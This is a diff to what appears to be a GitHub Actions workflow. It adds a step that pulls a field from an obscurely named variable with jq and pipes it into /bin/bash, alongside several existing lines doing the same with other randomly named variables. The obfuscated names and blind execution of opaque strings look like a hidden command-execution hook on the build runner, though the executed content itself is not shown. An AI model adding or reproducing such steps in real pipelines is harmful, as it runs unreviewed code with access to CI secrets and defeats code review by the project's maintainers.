@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$oir8472" | jq -r .yugga8 | /bin/bash
           printf '%s' "$jnc6782" | jq -r .wqq336 | /bin/bash
           echo $gq64 | jq -r .eqt2879 | /bin/bash
+          printf '%s' "$rduz580" | jq -r .z86 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
